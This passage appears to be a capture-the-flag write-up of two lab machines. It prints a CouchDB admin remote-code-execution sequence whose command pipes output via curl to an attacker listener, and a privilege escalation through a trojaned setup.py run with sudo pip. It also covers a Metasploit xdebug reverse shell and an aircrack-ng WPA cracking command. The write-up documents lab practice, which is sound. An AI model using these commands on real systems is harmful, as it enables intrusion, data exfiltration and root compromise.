$> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
$> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```

If we pay atenttion to the **home** directory, we'll just find **homer** user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the **ssh** one) worked, and seconds later I was able to get the user flag: 

![user_flag](./images/canape/user_flag.png)

### Root 

To start, I ran again the **LinEnum.sh** but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction.

In some moment, I thought that the couchdb was running as **root**. I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also **couchy** (look the docs of the **password** db) was admin. 
Thanks to this [blogpost](https://www.octority.com/2017/05/16/from-couchdb-admin-to-remote-code-execution/) first, and a little help from [this](https://stackoverflow.com/questions/37401355/cant-create-server-admin-in-couchdb) also I was able to successfully execute commands: 

```bash
curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '"whoami | curl http://10.10.14.255:5555 -d @-"'  --insecure
curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure
curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{"_id":"770855a97726d5666d70a22173005c77"}' --insecure
curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json' --insecure
```
Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the **whoami** wasn't root but homer. I must have confused with some other running process. 

I continued looking for some interesting thing, but nothing showed up. 

During that search, I issued: 
```bash
sudo -l 
```

And this was the output:
![sudoers][./images/canape/sudoers.png]

For those not very familiar, this means that the user **homer** can run as **root** the command **pip install** without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this?

**PIP** is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called **setup.py** which is the one in charge of really installing the package in your enviroment (virtual env or general env). 

So my idea was to, download a compressed version of package that already exists (I pick **request** because is my favourite lib), modify it's code, compress it again and try to install it using sudo:

* Downloaded the source code from [here](https://pypi.org/project/requests/).
* Decompressed it.
* Added the following line to the setup.py:
```python
os.system('cat /root/root.txt > /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')
```
(I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes)
* Compressed it again.
* Served it in a python serve so you can copy it to the machine .
* Executed:
```bash
sudo /usr/bin/pip install blablabla.tar.gz
```
* Read the flag from **/tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p**
* Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.

![root](./images/canape/root.png)


## Olympus

### User

Found a weird X-debug header. Keep googling for it and found that there is a metasploit module for it. 
Get reverse shell as www-data. 

Metasploit module: nix/http/xdebug_unauth_exec

cat the etc/passwd/ see the user zeus. Went to its home directory and find airgeddon directory 

Use the command download to get it. 

Find a capture directory wiht a pcap 
The pcap was about a connection to some wifi endpoint, deauth packets,probe requests. .etc. 
So clearly maybe we can bruteforce the password of the wifi. 

https://www.sunnyhoi.com/how-to-crack-wpawpa2-wi-fi-passwords-using-aircrack-ng-in-kali/

Used this command: 
aircrack-ng -a 2 -b f4:ec:38:ab:a8:a9 -w ~/Tools/john-1.8.0-jumbo-1/run/wordlists/rockyou.txt captured.cap

Password found.. Now? 

See traffic nothng yet..

GO back to the reverse shell.. upload a php one in order to later on updateit to tty


I tried to continue with this thing by installing the dropbox client in my machine. I though thay maybe allowing syncing I'll receive be able to read some directory or something like that... But no luck . 
